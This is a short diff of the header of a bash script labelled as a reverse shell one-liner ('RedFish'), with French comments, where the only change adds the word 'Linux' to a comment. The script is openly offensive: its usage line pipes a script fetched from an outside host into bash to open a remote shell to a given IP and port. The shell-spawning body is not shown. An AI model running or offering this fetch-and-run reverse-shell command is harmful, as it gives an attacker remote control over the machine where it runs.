@@ -1,6 +1,6 @@
 #!/bin/bash
 # RedFish — reverse shell one-liner (raw)
-# Tente chaque shell dans l'ordre ; le premier qui aboutit donne le shell.
+# Tente chaque shell Linux dans l'ordre ; le premier qui aboutit donne le shell.
 # Usage :
 #   curl -sL axolol.fr/r | bash -s <ip>:<port>
 A=${1:-127.0.0.1:4444}
